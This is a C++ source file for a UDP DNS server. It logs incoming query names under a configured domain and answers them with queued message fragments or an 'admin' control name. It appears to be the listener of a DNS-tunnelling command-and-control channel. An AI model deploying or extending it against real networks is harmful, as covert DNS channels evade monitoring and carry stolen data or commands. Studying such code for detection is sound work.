#include <iostream>
#include <cstring>

#include <algorithm>
#include <chrono>
#include <cctype>
#include <string_view>

#include <errno.h>

#include "server.hpp"
#include "debugLog.hpp"

#ifdef _WIN32
#pragma comment(lib, "ws2_32.lib")
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <unistd.h>
#endif

namespace
{
std::string endpointToString(const sockaddr_in& addr)
{
    char buffer[INET_ADDRSTRLEN] = {0};
#ifdef _WIN32
    if (InetNtopA(AF_INET, const_cast<in_addr*>(&addr.sin_addr), buffer, INET_ADDRSTRLEN) == nullptr)
        return std::string("<invalid>");
#else
    if (inet_ntop(AF_INET, &(addr.sin_addr), buffer, sizeof(buffer)) == nullptr)
        return std::string("<invalid>");
#endif
    return std::string(buffer) + ":" + std::to_string(ntohs(addr.sin_port));
}
}

using namespace std;
using namespace dns;


Server::Server(int port, const std::string& domainToResolve)
: Dns(domainToResolve)
, m_port(port)
{
    dns::debug::log("Server",
                    "Constructed for domain '" + m_domainToResolve +
                        "' on port " + std::to_string(m_port));
}


Server::~Server()
{
    stop();
}


void Server::stop()
{
    if (m_isStoped)
    {
        dns::debug::log("Server::stop",
                        "Stop requested but server already stopped");
        return;
    }
    dns::debug::log("Server::stop",
                    "Stopping server on port " + std::to_string(m_port));
    m_isStoped=true;
    // Send an empty datagram to unblock recvfrom
    struct sockaddr_in addr = m_address;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    char byte = 0;
    sendto(m_sockfd, &byte, 1, 0, (struct sockaddr*)&addr, sizeof(addr));
    dns::debug::log("Server::stop", "Sent loopback datagram to unblock recvfrom");
    if(m_dnsServ && m_dnsServ->joinable())
    {
        dns::debug::log("Server::stop", "Joining worker thread");
        m_dnsServ->join();
    }
#ifdef __linux__
    close(m_sockfd);
#elif _WIN32
    closesocket(m_sockfd);
    WSACleanup();
#endif
    dns::debug::log("Server::stop", "Socket closed");
}


void Server::launch()
{
#ifdef _WIN32
    WSADATA wsa{};
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {
        std::cerr << "[dns::Server] WSAStartup failed\n";
        return;
    }
#endif

    dns::debug::log("Server::launch",
                    "Launching server for domain '" + m_domainToResolve +
                        "' on port " + std::to_string(m_port));

    m_isStoped=false;
    m_sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    if(m_sockfd < 0)
    {
        dns::debug::log("Server::launch",
                        "socket() failed: " + std::string(strerror(errno)));
        m_isStoped = true;
#ifdef _WIN32
        WSACleanup();
#endif
        return;
    }

    dns::debug::log("Server::launch", "Socket created (fd=" +
                                         std::to_string(m_sockfd) + ")");

    m_address.sin_family = AF_INET;
    m_address.sin_addr.s_addr = INADDR_ANY;
    m_address.sin_port = htons(m_port);

    int rbind = bind(m_sockfd, (struct sockaddr *) & m_address, sizeof(struct sockaddr_in));
    if (rbind != 0)
    {
        string text("Could not bind: ");
        text += strerror(errno);

        dns::debug::log("Server::launch", text);

#ifdef _WIN32
        WSACleanup();
#endif

        return;
    }

    dns::debug::log("Server::launch",
                    "Socket bound to port " + std::to_string(m_port));

    this->m_dnsServ = std::make_unique<std::thread>(&Server::run, this);
    dns::debug::log("Server::launch", "Worker thread started");
}


void Server::run()
{
    char buffer[BUFFER_SIZE];
    struct sockaddr_in clientAddress;
    socklen_t addrLen = sizeof (struct sockaddr_in);

    dns::debug::log("Server::run", "Worker loop started");

    while(!m_isStoped)
    {
        auto waitStart = std::chrono::steady_clock::now();
        int nbytes = recvfrom(m_sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *) &clientAddress, &addrLen);
        auto afterRecv = std::chrono::steady_clock::now();

        if(nbytes <= 0)
        {
            if(m_isStoped)
            {
                dns::debug::log("Server::run",
                                "recvfrom() returned " + std::to_string(nbytes) +
                                    " while stopping");
                break;
            }

            dns::debug::log("Server::run",
                            "recvfrom() returned " + std::to_string(nbytes) +
                                ", continuing");
            continue;
        }

        std::string clientEndpoint = endpointToString(clientAddress);
        dns::debug::log(
            "Server::run",
            "Received " + std::to_string(nbytes) + " bytes from " +
                clientEndpoint + " after " +
                dns::debug::formatDuration(afterRecv - waitStart));

        Query query;
        query.decode(buffer, nbytes);

        std::string qname = query.getQName();

        dns::debug::log(
            "Server::run",
            "Decoded query id=" + std::to_string(query.getID()) + " qname='" +
                qname + "' qtype=" + std::to_string(query.getQType()) +
                " qclass=" + std::to_string(query.getQClass()));

        addReceivedQName(qname);

        Response response;
        auto handleStart = std::chrono::steady_clock::now();
        handleQuery(query, response);
        auto afterHandle = std::chrono::steady_clock::now();

        dns::debug::log(
            "Server::run",
            "handleQuery completed in " +
                dns::debug::formatDuration(afterHandle - handleStart) +
                "; outbound fragment queue size=" +
                std::to_string(
                    static_cast<unsigned long long>(m_msgQueue.size())));

        memset(buffer, 0, BUFFER_SIZE);
        nbytes = response.code(buffer);

        dns::debug::log(
            "Server::run",
            "Encoded response of " + std::to_string(nbytes) +
                " bytes with RDATA length=" +
                std::to_string(
                    static_cast<unsigned long long>(response.getRdata().size())));

        auto beforeSend = std::chrono::steady_clock::now();
        int sent = sendto(m_sockfd, buffer, nbytes, 0, (struct sockaddr *) &clientAddress, addrLen);
        auto afterSend = std::chrono::steady_clock::now();

        dns::debug::log(
            "Server::run",
            "Sent " + std::to_string(sent) + " bytes to " + clientEndpoint +
                " in " +
                dns::debug::formatDuration(afterSend - beforeSend));
    }

    dns::debug::log("Server::run", "Worker loop terminated");
}


void Server::handleQuery(const Query& query, Response& response)
{
    string qName = query.getQName();

    dns::debug::log(
        "Server::handleQuery",
        "Processing query name '" + qName + "'; pending outbound fragments=" +
            std::to_string(
                static_cast<unsigned long long>(m_msgQueue.size())));

    string domainName = "";
    if (endsWith(qName, m_domainToResolve))
    {
        if(!m_msgQueue.empty())
        {
            domainName = m_msgQueue.front();
            m_msgQueue.pop();

            dns::debug::log(
                "Server::handleQuery",
                "Using queued fragment for response; remaining fragments=" +
                    std::to_string(static_cast<unsigned long long>(
                        m_msgQueue.size())) +
                    " payload='" + domainName + "'");
        }
        else
        {
            domainName = "admin";
            domainName += generateRandomString(8);

            dns::debug::log(
                "Server::handleQuery",
                "No payload available; sending control domain '" + domainName +
                    "'");
        }
    }

    // std::cout << "domainName " << domainName << std::endl;

    if (domainName.empty())
    {
        // cout << "[-] Domain not in scope !" << endl;

        dns::debug::log(
            "Server::handleQuery",
            "Domain '" + qName + "' not in scope; sending NameError");

        response.setID( query.getID() );
        response.setName( query.getQName() );
        response.setType( query.getQType() );
        response.setClass( query.getQClass() );
        response.setRCode(Response::NameError);
        response.setRdLength(1); // null label
    }
    else
    {
        // cout << "[+] Domain in scope !" << endl;

        dns::debug::log(
            "Server::handleQuery",
            "Responding with payload '" + domainName + "' (" +
                std::to_string(static_cast<unsigned long long>(domainName.size())) +
                " bytes)");

        response.setRCode(Response::Ok);
        response.setRdLength(domainName.size()+2); // + initial label length & null label

        response.setID( query.getID() );
        response.setQdCount(1);
        response.setAnCount(1);
        response.setName( query.getQName() );
        response.setType( query.getQType() );
        response.setClass( query.getQClass() );
        response.setRdata(domainName);
    }

    // text = "Resolver::process()";
    // text += response.asString();
    // logger.trace(text);
}